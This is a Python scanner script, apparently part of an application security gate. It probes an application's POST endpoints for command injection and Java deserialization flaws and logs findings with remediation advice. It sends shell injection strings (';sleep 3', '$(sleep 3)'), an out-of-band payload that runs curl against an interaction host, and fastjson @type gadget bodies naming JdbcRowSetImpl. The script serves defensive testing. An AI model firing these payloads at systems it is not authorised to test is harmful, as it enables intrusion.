"""应用安全：RCE/命令注入/反序列化探针（只读，时间盲注/错误特征）。"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import time
import requests
import urllib3
try:
    import gate_common as gc
except ImportError:
    from checks import gate_common as gc
urllib3.disable_warnings()
BASE = gc.base_url()
ROOT = gc.ROOT
PAYLOADS = [';sleep 3', '|sleep 3', '$(sleep 3)', '`sleep 3`']
BODY_PAYLOADS = ['{"@type":"java.lang.AutoCloseable"}', '{"@type":"com.sun.rowset.JdbcRowSetImpl"}']

def main():
    tok = gc.token('admin02')
    if not tok:
        gc.emit('rce_probe', 'application', 'BLOCKED', [], blocked_reason='缺少 admin02 token')
        return
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': tok, 'Content-Type': 'application/json'}
    endpoints = [e for e in gc.endpoint_keys() if e.get('method') == 'POST' and (e.get('body_keys') or [])]
    findings = []
    tested = []
    for ep in endpoints[:6]:
        path = ep['path']
        keys = ep.get('body_keys') or []
        if not keys:
            continue
        key = keys[0]
        body = {k: '' for k in keys}
        body[key] = PAYLOADS[0]
        try:
            t0 = time.time()
            r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=10, verify=False)
            elapsed = round(time.time() - t0, 2)
        except requests.exceptions.Timeout:
            tested.append({'path': path, 'param': key, 'payload': PAYLOADS[0], 'timeout': True})
            findings.append(gc.finding('RCE-TIME-BLIND', 'high', f'命令注入疑似：{path} {key} sleep 超时', evidence='timeout', remediation='参数化/命令白名单'))
            continue
        except Exception:
            continue
        tested.append({'path': path, 'param': key, 'payload': PAYLOADS[0], 'elapsed': elapsed, 'code': (r.json() or {}).get('code') if r.text else None})
        if elapsed >= 3.0:
            findings.append(gc.finding('RCE-TIME-BLIND', 'high', f'命令注入疑似：{path} {key} 响应延迟 {elapsed}s', evidence=f'elapsed={elapsed}', remediation='参数化/命令白名单'))
    oast = os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json')
    if os.path.exists(oast):
        try:
            st = json.load(open(oast, encoding='utf-8'))
            tok = 'rce' + str(int(time.time()))
            domain = st.get('domain')
            payload = '$(curl -s http://%s.%s/rce)' % (tok, domain)
            ep = endpoints[0] if endpoints else None
            if ep:
                keys = ep.get('body_keys') or ['']
                body = {k: '' for k in keys}
                body[keys[0]] = payload
                requests.post(BASE + ep['path'], headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=10, verify=False)
                time.sleep(6)
                ints = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
                if os.path.exists(ints):
                    for line in open(ints, encoding='utf-8', errors='replace'):
                        if tok in line:
                            findings.append(gc.finding('RCE-OAST', 'critical', '命令注入 OAST 回调', evidence=line[:300], remediation='参数化/命令白名单'))
                            break
                tested.append({'path': ep['path'], 'param': keys[0], 'payload': 'OAST', 'checked': True})
        except Exception:
            pass
    for ep in endpoints[:3]:
        try:
            r = requests.post(BASE + ep['path'], headers=h, params={'t': str(int(time.time() * 1000))}, data=BODY_PAYLOADS[0], timeout=10, verify=False)
            tested.append({'path': ep['path'], 'json_gadget': True, 'http': r.status_code})
        except Exception:
            pass
    gc.emit('rce_probe', 'application', 'PASS', findings, summary=json.dumps({'tested': len(tested), 'details': tested}, ensure_ascii=False)[:500])
if __name__ == '__main__':
    main()
